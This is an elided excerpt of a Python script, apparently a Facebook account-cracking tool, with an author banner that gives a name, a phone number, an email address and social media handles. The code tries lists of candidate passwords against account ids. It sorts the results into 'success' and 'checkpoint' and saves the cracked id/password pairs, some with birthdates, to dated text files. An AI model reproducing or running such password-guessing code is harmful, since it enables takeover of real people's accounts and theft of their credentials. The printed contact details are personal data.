...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sAuthor: %sLosDool %s& %sWa:0895622487267\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/1000xxxx\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sLos Dool\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/KangLosDoll\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
...
def menu():
    ...
    print('%s╠══[%s•%s] %sName : LOS DOOL%s'%(O,P,O,P,users))
    print('%s╠══[%s•%s] %sEmail : ganzrendy856@gmail.com%s'%(O,P,O,P,maile))
    print('%s╠══[%s•%s] %sKey : Xxxxxxxx%s'%(O,P,O,P,kunci))
    print('%s╠══[%s•%s] %sJoin Since : 6-12-2021%s'%(O,P,O,P,bergabung))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sLosDool%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sLosDool%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sLosDool%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
